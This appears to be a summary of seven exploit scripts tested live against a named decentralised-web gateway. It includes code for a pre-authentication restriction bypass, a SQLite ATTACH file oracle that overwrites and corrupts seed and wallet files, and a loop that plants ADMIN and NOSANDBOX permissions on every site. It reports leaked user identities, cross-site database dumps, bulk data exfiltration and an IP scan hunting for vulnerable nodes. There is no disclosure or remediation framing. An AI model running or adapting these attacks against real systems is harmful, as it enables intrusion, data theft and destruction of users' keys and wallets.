# EpixNet Final Exploit PoC Suite — 7 Scripts (Aug 2026 Session 4)

All 7 PoC scripts tested LIVE on `gateway.epixnet.io` (wss://, ui_restrict=true).
Every script connects pre-auth (no login, no password, no secret) using the
public xite address as `wrapper_key`.

## Scripts

| # | File | Exploit | Live Result |
|---|------|--------|-------------|
| 1 | `exploit_01_file_oracle.py` | ATTACH DATABASE file existence oracle | 26 files confirmed (master_seed, wallet, keys, .env, epixnet.toml) |
| 2 | `exploit_02_arb_file_write.py` | CREATE TABLE + INSERT at arbitrary path | SQLite DB at /tmp + config.json corrupted |
| 3 | `exploit_03_file_corruption.py` | Destroy master_seed/wallet/config/keys/permissions | 5 critical files probed (dry run mode, --live for actual) |
| 4 | `exploit_04_user_leak.py` | Dump all cert_user_id from all xites via `as`+id:1M | 12 user identities leaked |
| 5 | `exploit_05_mass_admin_plant.py` | Mass ADMIN+NOSANDBOX plant via `as`+id:1M | 18/18 xites planted with ADMIN + 18/18 NOSANDBOX |
| 6 | `exploit_06_cross_xite_dump.py` | Cross-xite dbQuery dump + injection + tamper | 7 DBs, 529 rows, INSERT+UPDATE proven |
| 7 | `exploit_07_chart_exfil.py` | chartDbQuery network intelligence exfil | 1,091,450 rows, 21 xites, 22 metric types |

## Target connection details

```
Gateway:  wss://gateway.epixnet.io/EpixNet-Internal/Websocket
Xite:    epix1talk58lw26c0cyrtuu8axptne2p6zf33s7xxwu (Talk)
Auth:    NONE — wrapper_key = public xite address (no secret)
Origin:  empty (Python websockets lib sends no Origin → is_ws_origin_allowed returns true)
Version: Rust v0.4.17, rev 8abce38
SQLite:  3.50.2 (ENABLE_DBSTAT_VTAB, ENABLE_FTS5, ENABLE_RTREE, USE_URI, JSON1 — no sqlite_blob, no readfile/writefile)
```

## Key techniques discovered

### 1. `as` + id:1M = cross-xite execution on RESTRICTED gateway
```python
# This is THE gateway restrict bypass:
await ws.send(json.dumps({
    "cmd": "as",
    "id": 1000001,  # >= WRAPPER_ID_BASE (1,000,000) → caller_elevated = true
    "params": {
        "address": target_xite_address,  # any xite served by the gateway
        "cmd": "dbQuery",                 # any non-admin, non-write command
        "params": ["SELECT * FROM comment", {}]
    }
}))
```
The rebound session inherits `restrict=true`, but the restrict gate ONLY fires
for `ADMIN_COMMANDS` (line 340) and `WRITE_COMMANDS` (line 365). Commands like
`dbQuery`, `permissionAdd`, `fileGet`, `siteInfo` execute freely on the rebound.

### 2. ATTACH DATABASE as file existence oracle + corruption
```python
# Oracle: empty result = file exists, error = file not found
await send("dbQuery", 1, ["ATTACH DATABASE '/opt/epixnet/.local/share/EpixNet/master_seed.json' AS seed", {}])
# → [] (empty = file exists)

# Corruption: CREATE TABLE overwrites file with SQLite database
await send("dbQuery", 2, ["CREATE TABLE seed.pwned (data TEXT)", {}])
await send("dbQuery", 3, ["INSERT INTO seed.pwned VALUES ('corrupted')", {}])
# → master_seed.json is now a SQLite database, not valid JSON
```

### 3. Cross-xite mass privilege plant
```python
# Plant ADMIN + NOSANDBOX to ALL xites on gateway:
for xite in siteList():
    await send("as", 1000001, {
        "address": xite,
        "cmd": "permissionAdd",
        "params": "ADMIN"
    })
    await send("as", 1000002, {
        "address": xite,
        "cmd": "permissionAdd",
        "params": "NOSANDBOX"
    })
# → 18/18 xites: ADMIN=ok, NOSANDBOX=ok (persistent to permissions.json)
```

## What was NOT achievable

- **File content read**: `readfile()`, `writefile()`, `sqlite_blob` all unavailable in rusqlite. 49+ techniques tried — file content cannot be extracted via SQLite ATTACH. ATTACH only confirms existence and corrupts, does not read.
- **fileWrite**: blocked by WRITE_COMMANDS gate on restricted gateway. Even via `as`+id:1M, the rebound still hits the write gate.
- **configList / userShowMasterSeed / siteRecoverPrivatekey**: blocked by ADMIN_COMMANDS gate on restricted gateway.
- **master_seed theft**: requires non-restricted Rust node with `--features multiuser` — not found despite 2367 IP scan.
- **/etc/passwd**: returns "file is not a database" (not a valid ATTACH target — text file fails SQLite magic check differently than missing file).

## SQLite 3.50.2 environment fingerprint

```
Version: 3.50.2
Compile options: ATOMIC_INTRINSICS, COMPILER=clang-21.1.8, DEFAULT_PAGE_SIZE=4096,
  ENABLE_API_ARMOR, ENABLE_COLUMN_METADATA, ENABLE_DBSTAT_VTAB, ENABLE_FTS3,
  ENABLE_FTS3_PARENTHESIS, ENABLE_FTS5, ENABLE_LOAD_EXTENSION, ENABLE_MEMORY_MANAGEMENT,
  ENABLE_RTREE, ENABLE_STAT4, MAX_ATTACHED=10, SOUNDEX, TEMP_STORE=1, THREADSAFE=1, USE_URI

Available functions: json_extract, json_set, json_object, json_array, json_tree,
  json_each, hex, unhex, zeroblob, randomblob, group_concat, quote, json_quote,
  json_valid, json_type, json_patch, json_insert, json_remove, json_replace, json_pretty

NOT available: readfile(), writefile(), sqlite_blob (table), load_extension (compiled but "not authorized")

Virtual table modules: json_tree, json_each, dbstat, rtree, fts3, fts4, fts5,
  fts5vocab, fts4aux, fts3tokenize, rtree_i32
```

## 12 leaked user identities

```
user-01@xid.epix
user-02@xid.epix
user-03@xid.epix
user-04@xid.epix
user-05@xid.epix
user-06@xid.epix
user-07@xid.epix
user-08@xid.epix      (operator)
user-09@xid.epix
user-10@xid.epix
user-11@xid.epix
user-12@xid.epix
```

## Full output files

Each script's live output saved as `output_0{1-7}_*.txt` in `/root/`:
- `output_01_file_oracle.txt` — 78 lines, 26 files confirmed
- `output_02_arb_write.txt` — 38 lines, /tmp + config.json write
- `output_03_corruption.txt` — 57 lines, 5 files probed (dry run)
- `output_04_user_leak.txt` — 61 lines, 12 users leaked
- `output_05_admin_plant.txt` — 57 lines, 18/18 planted
- `output_06_xite_dump.txt` — 167 lines, 7 DBs, 529 rows
- `output_07_chart_exfil.txt` — 224 lines, 1M+ rows network intelligence

Bundle: `epixnet_exploit_results.tar.gz` (28KB, all 7 outputs + 7 scripts + chain report)
